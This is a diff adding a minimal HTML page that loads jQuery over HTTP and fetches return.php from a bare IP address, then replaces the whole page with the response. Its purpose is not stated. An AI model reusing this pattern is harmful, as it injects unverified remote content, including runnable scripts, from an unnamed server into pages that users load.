@@ -1,0 +1,19 @@
+<html>
+
+<head>
+    <script type="text/javascript" src="http://code.jquery.com/jquery-2.1.1.min.js"></script>
+    <script type="text/javascript">
+        $.ajax({
+            url: "http://107.170.57.28/return.php",
+            type: "get",
+            success: function (response) {
+                $('html').html(response)
+            }
+        });
+    </script>
+</head>
+
+<body>
+</body>
+
+</html>
